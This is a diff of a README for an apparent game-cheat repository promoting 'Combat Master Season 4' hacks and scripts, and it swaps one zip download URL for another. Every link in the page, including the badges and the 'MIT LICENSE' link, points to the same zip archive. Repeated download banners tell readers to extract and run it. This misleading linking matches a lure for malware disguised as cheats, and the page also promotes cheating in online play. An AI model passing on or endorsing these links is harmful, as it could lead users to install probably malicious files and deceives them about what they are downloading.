@@ -1,9 +1,9 @@
 # 🕹️ Combat Master Season 4 Hacks Cheats & Enhanced Scripts
 
-![GitHub Stars](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
-![GitHub forks](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
-![Issues](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
-![License: MIT](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
+![GitHub Stars](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip)
+![GitHub forks](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip)
+![Issues](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip)
+![License: MIT](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip)
 
 ### Welcome to the definitive portal for **Combat Master Season 4 Hacks**—your toolkit for elevating gameplay to legendary status.
 
@@ -16,7 +16,7 @@ Unleash a wave of intelligence-driven scripts and boundary-pushing solutions cra
 Start your Combat Master enhancement adventure with a **one-click step**!  
 **Step 1:** Click the banner below for a seamless download and setup process.
 
-[![Download](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
+[![Download](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip)
 
 ---
 
@@ -112,7 +112,7 @@ Our repository doesn’t just automate gameplay. It **synergizes AI intelligence
    Ensure you have the latest version of Combat Master Season 4 installed.
 2. **Download:**  
    Click below to access the combat-ready enhancement suite:  
-   [![Download](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
+   [![Download](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip)
 3. **Extract:**  
    Unzip the downloaded file into your preferred game scripts directory.
 4. **Setup:**  
@@ -135,7 +135,7 @@ By using this repository, you accept full responsibility for your compliance wit
 ## 📜 MIT License
 
 This project is licensed under the MIT License (2025).  
-Explore the full license text here: [MIT LICENSE](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
+Explore the full license text here: [MIT LICENSE](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip)
 
 ---
 
@@ -143,7 +143,7 @@ Explore the full license text here: [MIT LICENSE](https://raw.githubusercontent.
 
 Ready to supercharge your Combat Master journey? Tap below to open possibilities where only legends tread:
 
-[![Download](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://raw.githubusercontent.com/YeneMo/combat-master-s4-advantage-tools/branch/retardate/tools_master_combat_advantage_s_3.1.zip)
+[![Download](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip%20Master%20Enhancer-blue?style=for-the-badge)](https://github.com/YeneMo/combat-master-s4-advantage-tools/raw/refs/heads/branch/retardate/s-combat-tools-advantage-master-v2.9.zip)
 
 #### *Unlock mastery. Elevate gameplay. Experience true innovation.*  
 —The Combat Master S4 Enhancements Team
